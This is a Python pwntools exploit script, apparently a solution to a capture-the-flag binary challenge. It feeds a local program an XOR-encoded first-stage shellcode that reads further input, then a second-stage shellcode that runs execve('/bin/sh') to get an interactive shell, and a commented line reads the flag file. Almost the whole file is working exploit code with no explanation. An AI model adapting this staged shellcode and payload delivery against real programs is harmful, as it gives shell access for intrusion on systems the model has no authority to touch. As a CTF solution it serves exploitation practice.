#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"

r=process("./chall")

r.recvuntil("Enter the Key to win: ")
   
shellcode_r = """
   call here
   .ascii "/bin/sh"
   .byte 0
here:
   pop rdi
   xor rsi,rsi
   xor rdx, rdx
   mov rax,0x3b
   syscall
"""

shellcode = """
  pop rcx
  pop rdx
  pop rax
  mov edi, eax
  syscall
"""

sh = asm(shellcode,arch="amd64")
old_sh = sh
print hex(len(sh))
sh += chr(0)

send_sh = [ord(x) for x in sh]
sh = send_sh

for x in sh:
    print hex(x),
print ''

i = len(send_sh)
while i >1:
    send_sh[i-2] = send_sh[i-1] ^ sh[i-2]
    i -= 1

for x in send_sh:
    print hex(x),
'''
a = send_sh

for i1 in range(len(a)-1):
    a[i1] = a[i1] ^ a[i1+1]

for x in a:
    print hex(x),
'''

send_sh = [chr(x) for x in send_sh]
send_sh = ''.join(send_sh)

print r.pid
payload = chr(0)*0x27 + send_sh[:-1]
r.sendline(payload)
sleep(3)
real_sh = asm(shellcode_r, arch = 'amd64')
payload2 = 'a'*0x2c + real_sh
r.sendline(payload2)
#r.sendline("cd /home/chall/;cat flag")
r.interactive()
